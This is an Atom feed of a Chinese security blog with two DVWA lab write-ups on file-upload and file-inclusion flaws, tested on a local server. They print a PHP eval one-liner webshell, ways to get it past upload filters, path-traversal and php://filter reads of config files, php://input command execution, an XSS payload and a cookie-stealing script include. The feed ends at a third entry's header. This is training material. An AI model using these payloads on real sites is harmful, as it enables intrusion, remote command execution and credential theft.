<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Somnus&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Foxgrin.github.io/"/>
  <updated>2018-07-12T11:00:13.099Z</updated>
  <id>https://Foxgrin.github.io/</id>
  
  <author>
    <name>Somnus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dvwa-file upload</title>
    <link href="https://Foxgrin.github.io//posts/40994/"/>
    <id>https://Foxgrin.github.io//posts/40994/</id>
    <published>2018-07-12T08:27:00.000Z</published>
    <updated>2018-07-12T11:00:13.099Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的文件上传漏洞关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这部分内容涉及文件上传，我们先认识一下如何上传一个文件到服务器</p><p>表单标签部分：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Choose an image to upload:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里特别注意的是form标签中的entype属性规定了提交表单后如何对提交的数据进行编码，在表单需要提交二进制数据时，比如文件内容，要使用“multipart/form-data” </p><p>同时这里用了一个全局变量$_FILES</p><p>举个例子说明用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">    echo &apos;name:&apos;.$_FILES[&apos;file&apos;][&apos;name&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;type:&apos;.$_FILES[&apos;file&apos;][&apos;type&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;tmp_name:&apos;.$_FILES[&apos;file&apos;][&apos;tmp_name&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;size:&apos;.$_FILES[&apos;file&apos;][&apos;size&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意服务器接受的POST参数是upload，全局变量$_FILES，代表了上传到服务器的文件信息 </p><p>其中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_FILES[‘file‘][‘name’] : 代表上传文件的名称</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘size’] : 代表上传文件的大小</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘tmp_name’] : 代表上传的文件存储的临时路径</span><br><span class="line"></span><br><span class="line">$_FILES[‘file’][‘type’] : 代表上传文件的类型</span><br></pre></td></tr></table></figure></p><p>我们上传一个png文件试试 </p><p><img src="/img/dvwa-file-upload/1.png" alt=""></p><p>basename函数返回的是文件名，如果参数省略，则返回的文件名包含后缀 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],<span class="string">'.png'</span>);</span><br></pre></td></tr></table></figure><p>如果过滤掉.png后缀名，则上传png文件是不会返回.png的后缀名 </p><p><img src="/img/dvwa-file-upload/2.png" alt=""></p><p>move_uploaded_file函数作用是将我们上传的文件从临时目录移动到指定目录下，成功返回true,失败则返回false </p><p>我们试着上传一个png文件 </p><p><img src="/img/dvwa-file-upload/3.png" alt=""></p><p>看出上传成功 </p><p><img src="/img/dvwa-file-upload/4.png" alt=""></p><p>由于这里对我们上传的文件没有任何的检查，过滤等操作，因此我们可以上传任意木马文件，得到webshell，这就是文件上传漏洞</p><p>我们上传一句话木马到服务器，文件名为test.php</p><p>一句话木马代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'apple'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>打开中国菜刀 </p><p><img src="/img/dvwa-file-upload/6.png" alt=""></p><p>输入文件名所在地，然后POST的参数名称为apple</p><p>然后菜刀就会向服务器发送包含apple参数的POST请求，最终获得服务器的webshell权限</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$name=$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$size=$_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line">$type=$_FILES[&apos;file&apos;][&apos;type&apos;];</span><br><span class="line"></span><br><span class="line">if(($type == &quot;image/png&quot; || $type == &quot;image/jpeg&quot;) &amp;&amp; $size &lt; 100000)&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($name);</span><br><span class="line">if(!move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关对上传文件进行了一些过滤，可以看出只能上传jpg和png为后缀名的文件，并且文件大小不能超过100000B，因为我们上传的是一句话木马文件，所以不用担心文件大小超过限制，现在要考虑的是如何绕过后缀名的限制</p><p>我们先试着把一句话木马文件后缀名改为图片文件，然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到上传成功</p><p>那么我们打开中国菜刀，看看能不能获得webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获取webshell失败</p><p>可见图片文件是不行的，执行不了POST到服务器的命令</p><p>那么我们可以考虑用burp抓包，将文件名修改为test.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到我们上传的文件类型是png，是图片文件，符合条件上传成功，但是因为上传后图片就是png文件，所以菜刀POST到服务器的相关命令无法执行，所以我们要将上传成功后的文件名修改为php文件，这样就可以成功执行命令 </p><p><img src="/img/dvwa-file-upload/12.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传，再上菜刀 </p><p><img src="/img/dvwa-file-upload/14.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功获得webshell </p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;upload&apos;]))&#123;</span><br><span class="line">$name=$_FILES[&apos;file&apos;][&apos;name&apos;];</span><br><span class="line">$tmp_name=$_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">$size=$_FILES[&apos;file&apos;][&apos;size&apos;];</span><br><span class="line">$txt=substr($name,strrpos($name,&apos;.&apos;)+1);</span><br><span class="line"></span><br><span class="line">if((strtolower($txt) == &apos;jpg&apos; || strtolower($txt) == &apos;jpeg&apos; || strtolower($txt) == &apos;png&apos;) &amp;&amp; $size &lt; 100000 &amp;&amp; getimagesize($tmp_name))&#123;</span><br><span class="line">$target_path=&quot;C:/phpStudy/PHPTutorial/WWW/demo/file-upload/uploaded/&quot;;</span><br><span class="line">$target_path .= basename($name);</span><br><span class="line">if(!move_uploaded_file($tmp_name,$target_path))&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先了解几个函数</p><p>strpos：搜索字符串在另一字符串中第一次出现的位置（区分大小写）</p><p>stripos：搜索字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p>strrpos：搜索字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>strripos：搜索字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>举个例子说明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$str=<span class="string">"I love php,the greatest language is php."</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> stripos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strpos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strrpos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strrpos($str,<span class="string">'php'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> strripos($str,<span class="string">'PHP'</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而getimagesize函数会检测上传文件头，如果不包含相关的图片文件头，则报错</p><p>也就是说我们上传的文件名后缀必须是jpg,jepg,png，而且文件头必须是图像类型</p><p>在上一关中，是对上传文件的类型进行检查，如果不是图片类型则过滤，所以我们可以用burpsuite将发向服务器的请求中的文件名改为.php的后缀，这样类型依然是图片，就能巧妙的绕过过滤</p><p>而这一关是对上传文件的名字进行了检查，名字的后缀必须是.jpg或者.png或者.jpeg，而且文件的头信息必须是图片，上一关的方法修改文件名明显行不通，也就是说我们必须老实上传一个图片文件</p><p>但是我们可以将php代码加入到图片中</p><p>我们先创建一个一句话木马文件和一个图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再打开cmd，利用copy命令将两个文件合并为一个文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>打开合并后的文件可以看到，一句话木马被加到了最后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功通过检查</p><p>接下来打开菜刀</p><p>右键添加</p><p><a href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:/phpStudy/PHPTutorial/WWW/dvwa/hackable/uploads/hack.jpg</a></p><p>参数名写apple，脚本语言选择php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-upload/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功拿到webshell</p>]]></content>
    
    <summary type="html">
    
      dvwa-file upload
    
    </summary>
    
      <category term="dvwa-file upload" scheme="https://Foxgrin.github.io/categories/dvwa-file-upload/"/>
    
    
      <category term="file upload" scheme="https://Foxgrin.github.io/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-file inclusion</title>
    <link href="https://Foxgrin.github.io//posts/13543/"/>
    <id>https://Foxgrin.github.io//posts/13543/</id>
    <published>2018-07-11T14:16:00.000Z</published>
    <updated>2018-07-12T08:27:35.166Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的文件包含漏洞的关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">include($_GET[&apos;page&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源代码可以看出，当用户没有GET一个page值时，会自动给page赋值一个include.php，而这个include.php中就包含了三个文件给用户选择，希望用户能点击这三个文件进行文件包含</p><p>但是从攻击者的角度来看，当然不会乖乖的去点击这三个文件，因为page参数是不经过过滤，我们可以读取我们想要读的文件，前提是文件存在对应的目录。 </p><p>我们先要清楚，如果包含的是php文件，则正确包含，如果不是php文件，则原封不动的将文件内容输出到页面上 </p><p>这里说的php文件不一定是后缀名是php的文件，任何后缀文件只要里面包含了符合php语法的语句，通过文件包含函数include后，里面合法的代码就会被执行</p><p>举个例子，我们先在目录中创建一个phpinfo.txt </p><p>文件内容是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后给服务器GET一个page值为phpinfo.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现正常显示phpinfo信息，由此可知，只要文件内容符合php语法规范，那么任何扩展名都可以被php解析</p><p>再将phpinfo.txt信息修改为非php语法规范的语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样给服务器GET一个page值为phpinfo.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现暴露其源代码</p><p>所以我们可以利用这个特性，查看一些配置文件信息</p><p>首先要想查看文件信息，必定要弄清楚目录</p><p>我们先随便输入一个xxx.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现这个文件不存在，报错了，但同时把文件的绝对路径爆出来了</p><p>知道文件路径后，我们就可以查看一些配件文件，比如php配置信息</p><p>输入<a href="http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\WWW\dvwa/php.ini" target="_blank" rel="noopener">http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\WWW\dvwa/php.ini</a> </p><p>或者输入../../../../../../../phpStudy/PHPTutorial/WWW/dvwa/php.ini </p><p>输入这么多的../是为了保证能回到根目录下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再看一下mysql配置信息</p><p>输入<a href="http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\mysql\my.ini" target="_blank" rel="noopener">http://127.0.0.1/demo/file-inclusion/low.php?page=C:\phpStudy\PHPTutorial\mysql\my.ini</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以使用php内置封装协议来读取php文件</p><p>输入?php://filter/read=convert.base64-encode/resource=include.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现一段被base64加密过后的php源代码，经过解密后就可以得到php文件原本的代码 </p><p><img src="/img/dvwa-file-inclusion/8.png" alt=""></p><p>再用php://input写入php命令，前提是allow_url_include选项要为on</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在burpsuite中提交数据 </p><p><img src="/img/dvwa-file-inclusion/10.png" alt=""></p><p>发现提交的命令被执行了，那么是不是可以像xss一样提交恶意的脚本代码呢</p><p>我们提交</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(‘xss’)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功执行</p><p>我们再看看可不可以窃取cookie</p><p>输入 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span><span class="string">"&lt;script src='http://127.0.0.1/demo/xss(stored)/cookie.js'&gt;&lt;/script&gt;"</span>  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现成功跳转到steal.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功窃取到cookie值 </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">$page=str_replace(array(&apos;http://&apos;,&apos;https://&apos;),&apos;&apos;,$page);</span><br><span class="line">$page=str_replace(array(&quot;../&quot;,&quot;..\&quot;&quot;),&apos;&apos;,$page);</span><br><span class="line">//echo $page.&quot;&lt;br&gt;&quot;;</span><br><span class="line">include($page);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出对http:// 和https://，../和..\有过滤，但是因为是str_replace函数，所以双写即可绕过</p><p>而且如果读取绝对路径的话，就没有什么影响</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>先看一下当前php文件的绝对路径 </p><p><img src="/img/dvwa-file-inclusion/17.png" alt=""></p><p>复写../构造路径读取php配置文件 </p><p><img src="/img/dvwa-file-inclusion/18.png" alt=""></p><p>读取mysql配置文件</p><p>使用php内置协议读取文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>任意命令执行 </p><p><img src="/img/dvwa-file-inclusion/20.png" alt=""></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;page&apos;]))&#123;</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">if(!fnmatch(&apos;file*&apos;,$page) &amp;&amp; $page != &apos;include.php&apos;)&#123;</span><br><span class="line">echo &quot;ERROR:File not found&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">include($page);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">header(&quot;location:?page=include.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Fnmatch函数作用是在page值中搜索指定模式，指定必须以file开头的字符串才返回true，而我们要执行include，就必须不让if语句执行，所以page值必须以file开头</p><p>看似完全限制了，但是我们可以用file协议进行读取文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-file-inclusion/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      dvwa-file inclusion
    
    </summary>
    
      <category term="dvwa-file inclusion" scheme="https://Foxgrin.github.io/categories/dvwa-file-inclusion/"/>
    
    
      <category term="file inclusion" scheme="https://Foxgrin.github.io/tags/file-inclusion/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-xss(dom)</title>
    <link href="https://Foxgrin.github.io//posts/61192/"/>
    <id>https://Foxgrin.github.io//posts/61192/</id>
    <published>2018-07-11T13:38:00.000Z</published>
    <updated>2018-07-11T14:11:08.637Z</updated>
    
